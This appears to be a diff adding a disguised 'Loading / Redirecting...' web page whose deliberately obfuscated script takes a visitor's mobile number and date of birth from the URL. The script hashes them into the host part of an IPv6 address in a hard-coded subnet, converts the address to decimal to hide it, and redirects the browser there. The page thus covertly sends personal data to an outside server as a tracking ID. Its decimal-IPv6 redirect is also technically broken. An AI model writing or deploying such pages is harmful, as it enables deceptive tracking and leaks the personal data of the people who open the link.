@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Loading</title>
+<style>
+body{margin:0;padding:20px;font-family:Arial,sans-serif;background:#f5f5f5;display:flex;align-items:center;justify-content:center;min-height:100vh}
+.loader{text-align:center}
+.spinner{border:4px solid #f3f3f3;border-top:4px solid #3498db;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:0 auto 20px}
+@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+p{color:#666;font-size:14px}
+</style>
+</head>
+<body>
+<div class="loader">
+<div class="spinner"></div>
+<p>Redirecting...</p>
+</div>
+<script>
+// Obfuscated redirect logic
+(function(){
+// Configuration - Your IPv6 subnet
+const _0x1a2b='2001:470:1f2d:11e';
+const _0x3c4d='::';
+const _0x5e6f='/64';
+
+// Extract parameters from URL path
+// Expected format: /12345678/01011990 or ?m=12345678&d=01011990
+function _0x7g8h(){
+const _0x9i0j=window.location.pathname.split('/').filter(x=>x);
+const _0xka1b=new URLSearchParams(window.location.search);
+let _0xlc2m,_0xmd3n;
+if(_0x9i0j.length>=2){
+_0xlc2m=_0x9i0j[0];
+_0xmd3n=_0x9i0j[1];
+}else{
+_0xlc2m=_0xka1b.get('m')||_0xka1b.get('mobile')||_0xka1b.get('phone');
+_0xmd3n=_0xka1b.get('d')||_0xka1b.get('dob')||_0xka1b.get('date');
+}
+return{m:_0xlc2m,d:_0xmd3n};
+}
+
+// Generate IPv6 from mobile + DOB
+function _0xne4o(_0xof5p,_0xpg6q){
+if(!_0xof5p||!_0xpg6q)return null;
+// Add "04" prefix to mobile if not present
+let _0xqh7r=_0xof5p.toString().replace(/\D/g,'');
+if(!_0xqh7r.startsWith('04')&&_0xqh7r.length===8){
+_0xqh7r='04'+_0xqh7r;
+}
+// Clean DOB
+let _0xri8s=_0xpg6q.toString().replace(/\D/g,'');
+// Combine mobile + DOB to create unique tracking ID
+let _0xsj9t=_0xqh7r+_0xri8s;
+// Convert to hex for IPv6 host portion
+let _0xtk0u=BigInt(_0xsj9t);
+// Generate random additional bits for full 64-bit host
+let _0xul1v=BigInt(Math.floor(Math.random()*0xFFFFFFFF));
+let _0xvm2w=(_0xtk0u<<BigInt(32))|_0xul1v;
+// Convert to hex string (64 bits)
+let _0xwn3x=_0xvm2w.toString(16).padStart(16,'0');
+// Format as IPv6
+let _0xxo4y=_0xwn3x.match(/.{1,4}/g).join(':');
+return _0x1a2b+':'+_0xxo4y;
+}
+
+// Alternative: Use hash-based generation for better distribution
+function _0xyo5z(_0xzp6a,_0xaq7b){
+if(!_0xzp6a||!_0xaq7b)return null;
+let _0xbr8c=_0xzp6a.toString().replace(/\D/g,'');
+if(!_0xbr8c.startsWith('04')&&_0xbr8c.length===8){
+_0xbr8c='04'+_0xbr8c;
+}
+let _0xcs9d=_0xaq7b.toString().replace(/\D/g,'');
+let _0xdt0e=_0xbr8c+_0xcs9d;
+// Simple hash function
+let _0xeu1f=0;
+for(let i=0;i<_0xdt0e.length;i++){
+_0xeu1f=(((_0xeu1f<<5)-_0xeu1f)+_0xdt0e.charCodeAt(i))|0;
+}
+_0xeu1f=Math.abs(_0xeu1f);
+// Generate 64-bit value
+let _0xfv2g=BigInt(_0xeu1f)<<BigInt(32);
+let _0xgw3h=BigInt(Math.floor(Math.random()*0xFFFFFFFF));
+let _0xhx4i=_0xfv2g|_0xgw3h;
+let _0xiy5j=_0xhx4i.toString(16).padStart(16,'0');
+let _0xjz6k=_0xiy5j.match(/.{1,4}/g).join(':');
+return _0x1a2b+':'+_0xjz6k;
+}
+
+// Convert IPv6 to decimal for obfuscation
+function _0xka7l(_0xlb8m){
+if(!_0xlb8m)return null;
+let _0xmc9n=_0xlb8m.split(':').filter(x=>x);
+let _0xnd0o='';
+_0xmc9n.forEach(x=>{
+_0xnd0o+=x.padStart(4,'0');
+});
+return BigInt('0x'+_0xnd0o).toString();
+}
+
+// Main execution
+const _0xoe1p=_0x7g8h();
+if(_0xoe1p.m&&_0xoe1p.d){
+// Generate IPv6 using hash method (better distribution)
+const _0xpf2q=_0xyo5z(_0xoe1p.m,_0xoe1p.d);
+if(_0xpf2q){
+// Convert to decimal for URL obfuscation
+const _0xqg3r=_0xka7l(_0xpf2q);
+// Redirect after short delay
+setTimeout(()=>{
+window.location.href='http://'+_0xqg3r+'/';
+},500);
+}else{
+// Fallback - redirect to base IPv6
+setTimeout(()=>{
+window.location.href='http://['+_0x1a2b+_0x3c4d+'1]/';
+},500);
+}
+}else{
+// No params - redirect to base
+setTimeout(()=>{
+window.location.href='http://['+_0x1a2b+_0x3c4d+'1]/';
+},500);
+}
+})();
+</script>
+</body>
+</html>
